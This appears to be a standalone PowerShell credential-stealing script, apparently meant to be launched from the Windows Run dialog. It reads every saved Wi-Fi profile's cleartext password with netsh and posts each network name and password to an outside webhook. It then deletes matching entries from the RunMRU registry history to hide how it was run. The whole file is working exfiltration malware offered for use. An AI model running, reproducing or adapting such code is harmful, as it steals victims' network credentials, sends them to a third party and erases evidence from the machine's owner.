# Use this line if you intrested in typing your webhook inside file;
# $WEBHOOK =""





$profiles = netsh wlan show profile |
            Select-String "All User Profile" |
            ForEach-Object {
                ($_ -split ":",2)[1].Trim()
            }

foreach ($PROFILE_NAME in $profiles) {

    $passLine = netsh wlan show profile $PROFILE_NAME key=clear |
                Select-String "Key Content"

    if ($passLine) {
        $PASSWORD = ($passLine -split ":",2)[1].Trim()

        if ($PASSWORD -ne "") {
            $PAYLOAD = @{
    content = "Network: $PROFILE_NAME Password: $PASSWORD"
} | ConvertTo-Json

Invoke-RestMethod -Uri $WEBHOOK `
    -Method Post `
    -ContentType "application/json" `
    -Body $PAYLOAD | Out-Null
        }
        
    }
    
}
$RunMRUPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\'

$RunMRU = Get-ItemProperty -Path $RunMRUPath
$MRUList = $RunMRU.MRUList
0 .. ($MRUList.Length - 1) | foreach { $MRUList[$_] } | foreach {
if ($RunMRU.$_.Contains("$WEBHOOK")) {
Remove-ItemProperty -Path $RunMRUPath -Name $_ -Force
$NewMRUList = $MRUList.Replace("$_","")
Set-ItemProperty -Path $RunMRUPath -Name 'MRUList' -Value $NewMRUList -Force
}
}
	










